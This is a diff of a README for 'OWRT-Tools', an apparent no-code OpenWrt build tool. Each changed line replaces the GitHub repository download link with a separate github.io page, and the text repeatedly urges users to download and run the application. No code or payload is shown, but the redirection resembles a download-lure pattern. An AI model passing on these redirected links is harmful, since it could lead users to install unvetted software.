@@ -1,6 +1,6 @@
 # 🔧 OWRT-Tools - Build OpenWrt Without Coding
 
-[![Download Now](https://img.shields.io/badge/Download-OWRT_Tools-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Quilted-backscratcher820/OWRT-Tools)
+[![Download Now](https://img.shields.io/badge/Download-OWRT_Tools-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://quilted-backscratcher820.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Getting OWRT-Tools up and running takes less than five minutes. Just follow thes
 
 Click any download button on this page, or visit this link to download the application:
 
-[https://github.com/Quilted-backscratcher820/OWRT-Tools](https://github.com/Quilted-backscratcher820/OWRT-Tools)
+[https://quilted-backscratcher820.github.io](https://quilted-backscratcher820.github.io)
 
 Visit this link to download the application. You will see a button or a file on that page. Click it and wait for the download to finish.
 
@@ -47,7 +47,7 @@ Visit this link to download the application. You will see a button or a file on 
 Once the download completes, open your **Downloads** folder (or wherever your browser saves files). You should see a file named something like `OWRT-Tools` or `owrt-tools.zip`. Do not worry if it is a zipped (compressed) file – that is normal.
 
 Visit this link to download the application again if you need to:  
-[https://github.com/Quilted-backscratcher820/OWRT-Tools](https://github.com/Quilted-backscratcher820/OWRT-Tools)
+[https://quilted-backscratcher820.github.io](https://quilted-backscratcher820.github.io)
 
 ---
 
@@ -76,7 +76,7 @@ Do not worry about making mistakes. You can always press **Reset** to go back to
 ## 📦 Download and Installation Details
 
 Visit this link to download the application:  
-[https://github.com/Quilted-backscratcher820/OWRT-Tools](https://github.com/Quilted-backscratcher820/OWRT-Tools)
+[https://quilted-backscratcher820.github.io](https://quilted-backscratcher820.github.io)
 
 After you visit the link, follow these simple rules:
 
@@ -185,7 +185,7 @@ If you are a developer, you can view the source code on the repository page. But
 
 For your convenience, here is the main link one more time:
 
-**👉 [https://github.com/Quilted-backscratcher820/OWRT-Tools](https://github.com/Quilted-backscratcher820/OWRT-Tools)**
+**👉 [https://quilted-backscratcher820.github.io](https://quilted-backscratcher820.github.io)**
 
 Visit this link to download the application. Bookmark it so you never lose it.
 
